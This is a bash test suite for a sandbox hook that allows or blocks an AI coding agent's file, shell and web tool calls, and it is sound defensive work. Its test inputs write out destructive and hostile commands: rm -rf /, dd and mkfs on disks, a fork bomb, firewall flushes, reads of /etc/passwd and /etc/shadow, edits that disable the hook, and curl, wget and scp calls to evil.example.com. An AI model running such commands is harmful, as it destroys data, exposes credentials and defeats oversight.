#!/usr/bin/env bash
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HOOK="$SCRIPT_DIR/sandbox.sh"
REPO_ROOT=$(cd "$SCRIPT_DIR/../.." && git rev-parse --show-toplevel)
CWD="$REPO_ROOT"

export CIYA_ALLOWED_DOMAINS_FILE="$SCRIPT_DIR/allowed-domains.txt"

passed=0
failed=0

run_hook() {
  local json="$1"
  echo "$json" | bash "$HOOK" 2>/dev/null || true
}

get_decision() {
  local output="$1"
  if [[ -z "$output" ]]; then
    echo "allow"
  else
    echo "$output" | jq -r '.hookSpecificOutput.permissionDecision // "allow"'
  fi
}

assert_decision() {
  local test_name="$1"
  local expected="$2"
  local json="$3"

  local output
  output=$(run_hook "$json")
  local actual
  actual=$(get_decision "$output")

  if [[ "$actual" == "$expected" ]]; then
    echo "  PASS: $test_name"
    passed=$((passed + 1))
  else
    echo "  FAIL: $test_name (expected=$expected, actual=$actual)"
    [[ -n "$output" ]] && echo "        output: $output"
    failed=$((failed + 1))
  fi
}

mk_json() {
  local tool_name="$1"
  local tool_input="$2"
  jq -n --arg tn "$tool_name" --argjson ti "$tool_input" --arg cwd "$CWD" \
    '{tool_name: $tn, tool_input: $ti, cwd: $cwd}'
}

# ============================================================
echo "=== Path checks: allow inside repo ==="
# ============================================================

assert_decision "Read: absolute path inside repo" "allow" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT/CLAUDE.md\"}")"

assert_decision "Write: absolute path inside repo" "allow" \
  "$(mk_json Write "{\"file_path\": \"$REPO_ROOT/tmp.txt\", \"content\": \"test\"}")"

assert_decision "Edit: absolute path inside repo" "allow" \
  "$(mk_json Edit "{\"file_path\": \"$REPO_ROOT/CLAUDE.md\", \"old_string\": \"a\", \"new_string\": \"b\"}")"

assert_decision "Glob: path inside repo" "allow" \
  "$(mk_json Glob "{\"pattern\": \"**/*.sh\", \"path\": \"$REPO_ROOT\"}")"

assert_decision "Grep: path inside repo" "allow" \
  "$(mk_json Grep "{\"pattern\": \"test\", \"path\": \"$REPO_ROOT\"}")"

assert_decision "NotebookEdit: path inside repo" "allow" \
  "$(mk_json NotebookEdit "{\"notebook_path\": \"$REPO_ROOT/test.ipynb\", \"new_source\": \"x\"}")"

assert_decision "Read: repo root itself" "allow" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT\"}")"

assert_decision "Read: deeply nested path inside repo" "allow" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT/a/b/c/d/e/f.txt\"}")"

assert_decision "Glob: no path param (defaults to CWD)" "allow" \
  "$(mk_json Glob '{"pattern": "**/*.md"}')"

assert_decision "Grep: no path param (defaults to CWD)" "allow" \
  "$(mk_json Grep '{"pattern": "test"}')"

# ============================================================
echo "=== Path checks: deny outside repo ==="
# ============================================================

assert_decision "Read: /etc/passwd" "deny" \
  "$(mk_json Read '{"file_path": "/etc/passwd"}')"

assert_decision "Write: /var/evil.txt" "deny" \
  "$(mk_json Write '{"file_path": "/var/evil.txt", "content": "test"}')"

assert_decision "Edit: /etc/hosts" "deny" \
  "$(mk_json Edit '{"file_path": "/etc/hosts", "old_string": "a", "new_string": "b"}')"

assert_decision "Glob: /etc" "deny" \
  "$(mk_json Glob '{"pattern": "*.conf", "path": "/etc"}')"

assert_decision "Grep: /etc" "deny" \
  "$(mk_json Grep '{"pattern": "root", "path": "/etc"}')"

assert_decision "NotebookEdit: /var/test.ipynb" "deny" \
  "$(mk_json NotebookEdit '{"notebook_path": "/var/test.ipynb", "new_source": "x"}')"

# Path that is a prefix of repo but not a subdirectory
# e.g., repo is /home/kiyoh/.../limitaions-by-pretoolusehook
#        path is /home/kiyoh/.../limitaions-by-pretoolusehook-other
assert_decision "Read: repo-prefix path (not subdirectory)" "deny" \
  "$(mk_json Read "{\"file_path\": \"${REPO_ROOT}-other/file.txt\"}")"

# ============================================================
echo "=== Path checks: allow Claude Code memory directory ==="
# ============================================================

assert_decision "Read: ~/.claude/projects/ memory file" "allow" \
  "$(mk_json Read "{\"file_path\": \"$HOME/.claude/projects/test/memory/MEMORY.md\"}")"

assert_decision "Write: ~/.claude/projects/ memory file" "allow" \
  "$(mk_json Write "{\"file_path\": \"$HOME/.claude/projects/test/memory/notes.md\", \"content\": \"test\"}")"

assert_decision "Read: ~/.claude/projects dir itself" "allow" \
  "$(mk_json Read "{\"file_path\": \"$HOME/.claude/projects\"}")"

assert_decision "Read: ~/.claude/settings.json (denied)" "deny" \
  "$(mk_json Read "{\"file_path\": \"$HOME/.claude/settings.json\"}")"

assert_decision "Write: ~/.claude/hooks/sandbox.sh (denied)" "deny" \
  "$(mk_json Write "{\"file_path\": \"$HOME/.claude/hooks/sandbox.sh\", \"content\": \"exit 0\"}")"

assert_decision "Read: ~/.claude root (denied)" "deny" \
  "$(mk_json Read "{\"file_path\": \"$HOME/.claude/somefile\"}")"

# ============================================================
echo "=== Path checks: allow TMPDIR ==="
# ============================================================

assert_decision "Read: /tmp file" "allow" \
  "$(mk_json Read '{"file_path": "/tmp/test-sandbox/file.txt"}')"

assert_decision "Write: /tmp file" "allow" \
  "$(mk_json Write '{"file_path": "/tmp/test-sandbox/output.txt", "content": "test"}')"

assert_decision "Glob: /tmp directory" "allow" \
  "$(mk_json Glob '{"pattern": "*.sh", "path": "/tmp/test-sandbox"}')"

# ============================================================
echo "=== Path checks: traversal normalization ==="
# ============================================================

assert_decision "Read: ../ traversal from repo to /etc" "deny" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT/setup/../../../etc/passwd\"}")"

assert_decision "Read: relative ../ traversal" "deny" \
  "$(mk_json Read '{"file_path": "../../../etc/passwd"}')"

assert_decision "Read: ../ that stays inside repo" "allow" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT/setup/../CLAUDE.md\"}")"

assert_decision "Read: multiple ../ at boundary" "deny" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT/../../../../etc/shadow\"}")"

# ============================================================
echo "=== Self-protection: deny Write/Edit to protected paths ==="
# ============================================================

assert_decision "Write: .claude/hooks/sandbox.sh" "deny" \
  "$(mk_json Write "{\"file_path\": \"$REPO_ROOT/.claude/hooks/sandbox.sh\", \"content\": \"exit 0\"}")"

assert_decision "Write: .claude/hooks/new-hook.sh (allowed, not sandbox.sh)" "allow" \
  "$(mk_json Write "{\"file_path\": \"$REPO_ROOT/.claude/hooks/new-hook.sh\", \"content\": \"exit 0\"}")"

assert_decision "Edit: .claude/settings.json" "deny" \
  "$(mk_json Edit "{\"file_path\": \"$REPO_ROOT/.claude/settings.json\", \"old_string\": \"a\", \"new_string\": \"b\"}")"

assert_decision "Edit: .claude/settings.local.json" "deny" \
  "$(mk_json Edit "{\"file_path\": \"$REPO_ROOT/.claude/settings.local.json\", \"old_string\": \"a\", \"new_string\": \"b\"}")"

assert_decision "NotebookEdit: .claude/hooks/test.ipynb (allowed, not sandbox.sh)" "allow" \
  "$(mk_json NotebookEdit "{\"notebook_path\": \"$REPO_ROOT/.claude/hooks/test.ipynb\", \"new_source\": \"x\"}")"

# ============================================================
echo "=== Self-protection: allow Read of protected paths ==="
# ============================================================

assert_decision "Read: .claude/hooks/sandbox.sh (read is allowed)" "allow" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT/.claude/hooks/sandbox.sh\"}")"

assert_decision "Read: .claude/settings.json (read is allowed)" "allow" \
  "$(mk_json Read "{\"file_path\": \"$REPO_ROOT/.claude/settings.json\"}")"

# ============================================================
echo "=== Self-protection: Bash targeting hook files ==="
# ============================================================

assert_decision "Bash: rm .claude/hooks/sandbox.sh" "deny" \
  "$(mk_json Bash '{"command": "rm .claude/hooks/sandbox.sh", "description": "test"}')"

assert_decision "Bash: cat > .claude/settings.json" "deny" \
  "$(mk_json Bash '{"command": "cat > .claude/settings.json", "description": "test"}')"

assert_decision "Bash: sed -i on .claude/settings.local.json" "deny" \
  "$(mk_json Bash '{"command": "sed -i s/old/new/ .claude/settings.local.json", "description": "test"}')"

assert_decision "Bash: cp over .claude/hooks/" "deny" \
  "$(mk_json Bash '{"command": "cp /tmp/evil.sh .claude/hooks/sandbox.sh", "description": "test"}')"

# ============================================================
echo "=== Network: domain matching ==="
# ============================================================

assert_decision "WebFetch: exact match (anthropic.com)" "allow" \
  "$(mk_json WebFetch '{"url": "https://anthropic.com/index", "prompt": "test"}')"

assert_decision "WebFetch: subdomain match (api.anthropic.com)" "allow" \
  "$(mk_json WebFetch '{"url": "https://api.anthropic.com/v1/messages", "prompt": "test"}')"

assert_decision "WebFetch: deep subdomain (a.b.anthropic.com)" "allow" \
  "$(mk_json WebFetch '{"url": "https://a.b.anthropic.com/path", "prompt": "test"}')"

assert_decision "WebFetch: non-subdomain prefix (notanthropic.com)" "deny" \
  "$(mk_json WebFetch '{"url": "https://notanthropic.com/path", "prompt": "test"}')"

assert_decision "WebFetch: denied domain" "deny" \
  "$(mk_json WebFetch '{"url": "https://evil.example.com/malware", "prompt": "test"}')"

assert_decision "WebFetch: URL with credentials (user:pass@host)" "allow" \
  "$(mk_json WebFetch '{"url": "https://user:pass@api.anthropic.com/v1", "prompt": "test"}')"

assert_decision "WebFetch: URL with port" "allow" \
  "$(mk_json WebFetch '{"url": "https://api.anthropic.com:8443/v1", "prompt": "test"}')"

assert_decision "WebSearch: always allowed" "allow" \
  "$(mk_json WebSearch '{"query": "test search"}')"

# ============================================================
echo "=== Network: CIYA_ALLOWED_DOMAINS_FILE unset ==="
# ============================================================

CIYA_ALLOWED_DOMAINS_FILE="" assert_decision "WebFetch: CIYA_ALLOWED_DOMAINS_FILE unset" "deny" \
  "$(mk_json WebFetch '{"url": "https://api.anthropic.com/v1", "prompt": "test"}')"

CIYA_ALLOWED_DOMAINS_FILE="" assert_decision "Bash curl: CIYA_ALLOWED_DOMAINS_FILE unset" "deny" \
  "$(mk_json Bash '{"command": "curl https://api.anthropic.com", "description": "test"}')"

CIYA_ALLOWED_DOMAINS_FILE="/nonexistent/path/domains.txt" assert_decision "WebFetch: CIYA_ALLOWED_DOMAINS_FILE file missing" "deny" \
  "$(mk_json WebFetch '{"url": "https://api.anthropic.com/v1", "prompt": "test"}')"

# ============================================================
echo "=== Bash destructive: disk operations ==="
# ============================================================

assert_decision "mkfs.ext4 /dev/sda1" "deny" \
  "$(mk_json Bash '{"command": "mkfs.ext4 /dev/sda1", "description": "test"}')"

assert_decision "fdisk /dev/sda" "deny" \
  "$(mk_json Bash '{"command": "fdisk /dev/sda", "description": "test"}')"

assert_decision "wipefs -a /dev/sda" "deny" \
  "$(mk_json Bash '{"command": "wipefs -a /dev/sda", "description": "test"}')"

assert_decision "parted /dev/sda" "deny" \
  "$(mk_json Bash '{"command": "parted /dev/sda mklabel gpt", "description": "test"}')"

assert_decision "dd if=/dev/zero of=/dev/sda" "deny" \
  "$(mk_json Bash '{"command": "dd if=/dev/zero of=/dev/sda bs=1M", "description": "test"}')"

assert_decision "dd of=/dev/sda (without if=/dev/)" "deny" \
  "$(mk_json Bash '{"command": "dd of=/dev/sda bs=1M", "description": "test"}')"

assert_decision "> /dev/sda (overwrite device)" "deny" \
  "$(mk_json Bash '{"command": "echo x > /dev/sda", "description": "test"}')"

# ============================================================
echo "=== Bash destructive: system control ==="
# ============================================================

assert_decision "shutdown -h now" "deny" \
  "$(mk_json Bash '{"command": "shutdown -h now", "description": "test"}')"

assert_decision "reboot" "deny" \
  "$(mk_json Bash '{"command": "reboot", "description": "test"}')"

assert_decision "poweroff" "deny" \
  "$(mk_json Bash '{"command": "poweroff", "description": "test"}')"

assert_decision "halt" "deny" \
  "$(mk_json Bash '{"command": "halt", "description": "test"}')"

assert_decision "init 0" "deny" \
  "$(mk_json Bash '{"command": "init 0", "description": "test"}')"

assert_decision "init 6" "deny" \
  "$(mk_json Bash '{"command": "init 6", "description": "test"}')"

# ============================================================
echo "=== Bash destructive: firewall ==="
# ============================================================

assert_decision "iptables -F" "deny" \
  "$(mk_json Bash '{"command": "iptables -F", "description": "test"}')"

assert_decision "ip6tables -F" "deny" \
  "$(mk_json Bash '{"command": "ip6tables -F", "description": "test"}')"

assert_decision "ufw disable" "deny" \
  "$(mk_json Bash '{"command": "ufw disable", "description": "test"}')"

# ============================================================
echo "=== Bash destructive: root deletion ==="
# ============================================================

assert_decision "rm -rf /" "deny" \
  "$(mk_json Bash '{"command": "rm -rf /", "description": "test"}')"

assert_decision "rm -rf /*" "deny" \
  "$(mk_json Bash '{"command": "rm -rf /*", "description": "test"}')"

assert_decision "rm -fr / (reversed flags)" "deny" \
  "$(mk_json Bash '{"command": "rm -fr /", "description": "test"}')"

assert_decision "rm -rf / (with trailing space)" "deny" \
  "$(mk_json Bash '{"command": "rm -rf / && echo done", "description": "test"}')"

assert_decision "rm -rf node_modules (safe relative)" "allow" \
  "$(mk_json Bash '{"command": "rm -rf node_modules", "description": "test"}')"

assert_decision "rm -rf absolute path in repo (safe)" "allow" \
  "$(mk_json Bash "{\"command\": \"rm -rf $REPO_ROOT/node_modules\", \"description\": \"test\"}")"

# ============================================================
echo "=== Bash destructive: permissions ==="
# ============================================================

assert_decision "chmod 777 /" "deny" \
  "$(mk_json Bash '{"command": "chmod 777 /", "description": "test"}')"

assert_decision "chmod -R 777 /" "deny" \
  "$(mk_json Bash '{"command": "chmod -R 777 /", "description": "test"}')"

assert_decision "chmod 644 (safe)" "allow" \
  "$(mk_json Bash '{"command": "chmod 644 file.txt", "description": "test"}')"

assert_decision "chown root /" "deny" \
  "$(mk_json Bash '{"command": "chown root /etc/passwd", "description": "test"}')"

# ============================================================
echo "=== Bash destructive: fork bomb ==="
# ============================================================

assert_decision "fork bomb :(){ :|:&};:" "deny" \
  "$(mk_json Bash '{"command": ":(){ :|:&};:", "description": "test"}')"

# ============================================================
echo "=== Bash destructive: safe commands (no false positive) ==="
# ============================================================

assert_decision "ls -la" "allow" \
  "$(mk_json Bash '{"command": "ls -la", "description": "test"}')"

assert_decision "git status" "allow" \
  "$(mk_json Bash '{"command": "git status", "description": "test"}')"

assert_decision "npm install" "allow" \
  "$(mk_json Bash '{"command": "npm install", "description": "test"}')"

assert_decision "git push origin main" "allow" \
  "$(mk_json Bash '{"command": "git push origin main", "description": "test"}')"

assert_decision "git fetch origin" "allow" \
  "$(mk_json Bash '{"command": "git fetch origin", "description": "test"}')"

assert_decision "rm -rf (relative path)" "allow" \
  "$(mk_json Bash '{"command": "rm -rf dist/", "description": "test"}')"

assert_decision "dd without device (safe)" "allow" \
  "$(mk_json Bash '{"command": "dd if=input.bin of=output.bin", "description": "test"}')"

# ============================================================
echo "=== Bash paths: deny outside allowed locations ==="
# ============================================================

assert_decision "Bash: cat /etc/passwd" "deny" \
  "$(mk_json Bash '{"command": "cat /etc/passwd", "description": "test"}')"

assert_decision "Bash: ls /home/otheruser" "deny" \
  "$(mk_json Bash '{"command": "ls /home/otheruser", "description": "test"}')"

assert_decision "Bash: bash /opt/script.sh" "deny" \
  "$(mk_json Bash '{"command": "bash /opt/script.sh", "description": "test"}')"

# ============================================================
echo "=== Bash paths: allow inside repo ==="
# ============================================================

assert_decision "Bash: cat file inside repo" "allow" \
  "$(mk_json Bash "{\"command\": \"cat $REPO_ROOT/CLAUDE.md\", \"description\": \"test\"}")"

assert_decision "Bash: bash script inside repo" "allow" \
  "$(mk_json Bash "{\"command\": \"bash $REPO_ROOT/setup/up_test.sh\", \"description\": \"test\"}")"

# ============================================================
echo "=== Bash paths: allow TMPDIR ==="
# ============================================================

assert_decision "Bash: cat /tmp file" "allow" \
  "$(mk_json Bash '{"command": "cat /tmp/test-dir/file.txt", "description": "test"}')"

assert_decision "Bash: rm -rf /tmp test dir" "allow" \
  "$(mk_json Bash '{"command": "rm -rf /tmp/test-sandbox", "description": "test"}')"

# ============================================================
echo "=== Bash paths: allow /dev/ paths ==="
# ============================================================

assert_decision "Bash: echo to /dev/null" "allow" \
  "$(mk_json Bash '{"command": "echo test > /dev/null", "description": "test"}')"

assert_decision "Bash: cat /dev/urandom" "allow" \
  "$(mk_json Bash '{"command": "head -c 32 /dev/urandom | base64", "description": "test"}')"

# ============================================================
echo "=== Bash paths: deny quoted paths outside repo ==="
# ============================================================

assert_decision "Bash: cat double-quoted /etc/passwd" "deny" \
  "$(mk_json Bash '{"command": "cat \"/etc/passwd\"", "description": "test"}')"

assert_decision "Bash: cat single-quoted /etc/passwd" "deny" \
  "$(mk_json Bash '{"command": "cat '"'"'/etc/passwd'"'"'", "description": "test"}')"

assert_decision "Bash: ls double-quoted /home/otheruser" "deny" \
  "$(mk_json Bash '{"command": "ls \"/home/otheruser\"", "description": "test"}')"

assert_decision "Bash: cat double-quoted repo path (allow)" "allow" \
  "$(mk_json Bash "{\"command\": \"cat \\\"$REPO_ROOT/CLAUDE.md\\\"\", \"description\": \"test\"}")"

assert_decision "Bash: cat single-quoted /tmp path (allow)" "allow" \
  "$(mk_json Bash '{"command": "cat '"'"'/tmp/test-file.txt'"'"'", "description": "test"}')"

assert_decision "Bash: echo to double-quoted /dev/null (allow)" "allow" \
  "$(mk_json Bash '{"command": "echo test > \"/dev/null\"", "description": "test"}')"

# ============================================================
echo "=== Bash paths: deny redirect to outside paths ==="
# ============================================================

assert_decision "Bash: input redirect </etc/passwd" "deny" \
  "$(mk_json Bash '{"command": "cat</etc/passwd", "description": "test"}')"

assert_decision "Bash: output redirect >/etc/passwd" "deny" \
  "$(mk_json Bash '{"command": ">/etc/passwd", "description": "test"}')"

assert_decision "Bash: append redirect >>/opt/script.sh" "deny" \
  "$(mk_json Bash '{"command": "echo x>>/opt/script.sh", "description": "test"}')"

assert_decision "Bash: fd redirect 2>/home/otheruser/log" "deny" \
  "$(mk_json Bash '{"command": "cmd 2>/home/otheruser/log", "description": "test"}')"

assert_decision "Bash: redirect to /tmp (allow)" "allow" \
  "$(mk_json Bash '{"command": "echo test>/tmp/output.txt", "description": "test"}')"

assert_decision "Bash: redirect to /dev/null no space (allow)" "allow" \
  "$(mk_json Bash '{"command": "cmd 2>/dev/null", "description": "test"}')"

# ============================================================
echo "=== Bash paths: deny assignment to outside paths ==="
# ============================================================

assert_decision "Bash: DEST=/etc/passwd" "deny" \
  "$(mk_json Bash '{"command": "DEST=/etc/passwd", "description": "test"}')"

assert_decision "Bash: export VAR=/opt/script.sh" "deny" \
  "$(mk_json Bash '{"command": "export VAR=/opt/script.sh", "description": "test"}')"

assert_decision "Bash: VAR=/tmp/safe (allow)" "allow" \
  "$(mk_json Bash '{"command": "VAR=/tmp/safe-file", "description": "test"}')"

assert_decision "Bash: VAR=relative (allow)" "allow" \
  "$(mk_json Bash '{"command": "DEST=relative/path", "description": "test"}')"

# ============================================================
echo "=== Bash paths: deny parenthesized outside paths ==="
# ============================================================

assert_decision "Bash: subshell (/etc/script)" "deny" \
  "$(mk_json Bash '{"command": "(/etc/script.sh)", "description": "test"}')"

assert_decision "Bash: cmd substitution $(/opt/script.sh)" "deny" \
  "$(mk_json Bash '{"command": "$(/opt/script.sh)", "description": "test"}')"

assert_decision "Bash: subshell with /tmp (allow)" "allow" \
  "$(mk_json Bash '{"command": "(/tmp/test-script.sh)", "description": "test"}')"

# ============================================================
echo "=== Bash paths: deny tilde traversal ==="
# ============================================================

assert_decision "Bash: tilde traversal ~/../../etc/passwd" "deny" \
  "$(mk_json Bash '{"command": "cat ~/../../etc/passwd", "description": "test"}')"

assert_decision "Bash: tilde path ~/sensitive-file" "deny" \
  "$(mk_json Bash '{"command": "cat ~/sensitive-file", "description": "test"}')"

assert_decision "Bash: tilde with double-dot ~/../../../opt/x" "deny" \
  "$(mk_json Bash '{"command": "cat ~/../../../opt/x", "description": "test"}')"

# ============================================================
echo "=== Bash paths: URL paths not falsely detected ==="
# ============================================================

assert_decision "Bash: curl URL path not extracted" "allow" \
  "$(mk_json Bash '{"command": "curl https://api.anthropic.com/v1/messages", "description": "test"}')"

assert_decision "Bash: scp remote path not extracted" "deny" \
  "$(mk_json Bash '{"command": "scp user@evil.example.com:/etc/passwd .", "description": "test"}')"

# ============================================================
echo "=== Bash network: allowed domains ==="
# ============================================================

assert_decision "curl allowed URL" "allow" \
  "$(mk_json Bash '{"command": "curl https://api.anthropic.com/v1/messages", "description": "test"}')"

assert_decision "wget allowed URL" "allow" \
  "$(mk_json Bash '{"command": "wget https://anthropic.com/docs", "description": "test"}')"

assert_decision "git clone allowed URL" "allow" \
  "$(mk_json Bash '{"command": "git clone https://claude.ai/repo.git", "description": "test"}')"

# ============================================================
echo "=== Bash network: denied domains ==="
# ============================================================

assert_decision "curl denied URL" "deny" \
  "$(mk_json Bash '{"command": "curl https://evil.example.com/payload", "description": "test"}')"

assert_decision "wget denied URL" "deny" \
  "$(mk_json Bash '{"command": "wget https://evil.example.com/malware.sh", "description": "test"}')"

assert_decision "ssh user@denied.host" "deny" \
  "$(mk_json Bash '{"command": "ssh user@evil.example.com", "description": "test"}')"

assert_decision "scp user@denied.host:file ." "deny" \
  "$(mk_json Bash '{"command": "scp user@evil.example.com:/etc/passwd .", "description": "test"}')"

assert_decision "git clone denied URL" "deny" \
  "$(mk_json Bash '{"command": "git clone https://evil.example.com/repo.git", "description": "test"}')"

assert_decision "curl multiple URLs (one denied)" "deny" \
  "$(mk_json Bash '{"command": "curl https://api.anthropic.com/v1 && curl https://evil.example.com/x", "description": "test"}')"

# ============================================================
echo "=== Bash network: passthrough (domain not extractable) ==="
# ============================================================

assert_decision "curl with variable URL" "ask" \
  "$(mk_json Bash '{"command": "curl \"$URL\"", "description": "test"}')"

assert_decision "wget with variable URL" "ask" \
  "$(mk_json Bash '{"command": "wget $DOWNLOAD_URL", "description": "test"}')"

assert_decision "ssh with just hostname (no TLD)" "ask" \
  "$(mk_json Bash '{"command": "ssh myserver", "description": "test"}')"

# ============================================================
echo "=== Default: other tools allowed ==="
# ============================================================

assert_decision "Task tool" "allow" \
  "$(mk_json Task '{"prompt": "find files", "description": "test", "subagent_type": "Explore"}')"

assert_decision "Unknown tool" "allow" \
  "$(mk_json SomeNewTool '{"arg": "value"}')"

# ============================================================
echo "=== Content commands: skip destructive check ==="
# ============================================================

assert_decision "git commit with dd in message" "allow" \
  "$(mk_json Bash '{"command": "git commit -m \"dd if=/dev/zero of=/dev/sda\"", "description": "test"}')"

assert_decision "gh pr edit with destructive text in body" "allow" \
  "$(mk_json Bash '{"command": "gh pr edit 25 --body \"rm -rf / and dd of=/dev/sda\"", "description": "test"}')"

assert_decision "gh pr create with destructive text in body" "allow" \
  "$(mk_json Bash '{"command": "gh pr create --title \"test\" --body \"shutdown -h now\"", "description": "test"}')"

assert_decision "gh issue create with destructive text in body" "allow" \
  "$(mk_json Bash '{"command": "gh issue create --body \"mkfs /dev/sda\"", "description": "test"}')"

assert_decision "gh issue edit with destructive text in body" "allow" \
  "$(mk_json Bash '{"command": "gh issue edit 1 --body \"reboot the server\"", "description": "test"}')"

# ============================================================
echo ""
echo "=== Results: $passed passed, $failed failed ==="
[[ $failed -eq 0 ]] && echo "All tests passed!" || exit 1
